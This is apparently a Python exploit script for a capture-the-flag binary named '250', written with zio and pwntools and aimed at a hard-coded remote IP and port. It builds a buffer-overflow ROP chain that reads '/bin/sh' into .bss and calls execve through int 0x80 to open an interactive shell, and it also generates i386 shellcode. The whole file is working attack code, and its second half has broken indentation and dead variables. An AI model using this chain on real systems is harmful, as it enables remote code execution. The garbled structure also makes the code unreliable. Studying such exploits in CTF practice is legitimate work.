from zio import *
is_local = True
is_local = False
binary_path = "./250"
libc_file_path = ""
#libc_file_path = "./libc.so.6"
ip = "60.191.205.81"
port = 2017
if is_local:
	target = binary_path
else:
	target = (ip, port)
def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io
def gen_rop_data(func_addr, args, pie_text_base = 0):
    p_ret = [0x080481b2, 0x08048480, 0x0804847f, 0x0804847e, 0x080483c7, 0x08098774]
    rop_data  = ''
    rop_data += l32(func_addr)
    if len(args) > 0:
        rop_data += l32(p_ret[len(args)] + pie_text_base)
    for arg in args:
        rop_data += l32(arg)
    return rop_data
from pwn import*
import time
def pwn(io):
#offset info
	if is_local:
#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
#remote
		offset_system = 0x0
		offset_binsh = 0x0
		io.read_until("]")
		dl_mk_stack_exe = 0x080A0AF0
		context(arch = 'i386', os = 'linux')
		shellcode = asm(shellcraft.i386.sh())
#0x080e77dc : add ebx, esp ; add dword ptr [edx], ecx ; ret
		ebx_esp = 0x080e77dc
#0x080481c9 : pop ebx ; ret
		p_ebx_ret = 0x080481c9
#0x0804f2ea : mov eax, ebx ; pop ebx ; ret
		mov_eax_ebx_p_ret = 0x0804f2ea
#0x0806cbb5 : int 0x80
p_eax_ret = 0x080b89e6
p_ebx_ret = 0x080481c9
p_ecx_ret = 0x080df1b9
p_edx_ret = 0x0806efbb
int80_addr = 0x0806cbb5
read_addr = 0x0806D510
bss_addr = 0x080ece00
payload = ""
payload += "a"*0x3a
payload += l32(0)
payload += gen_rop_data(read_addr, [0, bss_addr, 8])
payload += l32(p_eax_ret)
payload += l32(0xb)
payload += l32(p_ebx_ret)
payload += l32(bss_addr)
payload += l32(p_ecx_ret)
payload += l32(0)
payload += l32(p_edx_ret)
payload += l32(0)
payload += l32(int80_addr)
io.writeline(str(1000))
io.read_until("]")
io.gdb_hint()
io.writeline(payload)
io.read_until("]")
time.sleep(1)
io.writeline("/bin/sh\x00")
io.interact()
io.interact()
io = get_io(target)
pwn(io)
